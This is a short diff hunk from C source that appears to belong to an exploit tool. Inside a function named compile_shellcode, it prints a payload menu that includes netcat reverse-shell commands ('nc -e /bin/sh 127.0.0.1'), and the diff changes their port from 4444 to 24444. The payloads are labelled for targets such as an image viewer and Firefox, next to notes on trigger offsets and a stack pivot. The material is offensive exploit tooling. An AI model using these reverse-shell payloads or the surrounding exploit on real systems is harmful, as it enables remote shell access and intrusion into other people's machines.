@@ -598,8 +598,8 @@ int compile_shellcode(void)
     
     printf("\n[Payloads]\n");
     printf("%-30s : /usr/bin/logger 'PWNED'\n", "Default (Syslog)");
-    printf("%-30s : nc -e /bin/sh 127.0.0.1 4444\n", "Local Viewer (EOG)");
-    printf("%-30s : nc -e /bin/sh 127.0.0.1 4444\n", "Sandbox Safe (Firefox)");
+    printf("%-30s : nc -e /bin/sh 127.0.0.1 24444\n", "Local Viewer (EOG)");
+    printf("%-30s : nc -e /bin/sh 127.0.0.1 24444\n", "Sandbox Safe (Firefox)");
 
     printf("\n[Trigger Offsets & Alignment]\n");
     printf("%-30s : 0x00 (Direct Stack Pivot)\n", "Internal Consumer");
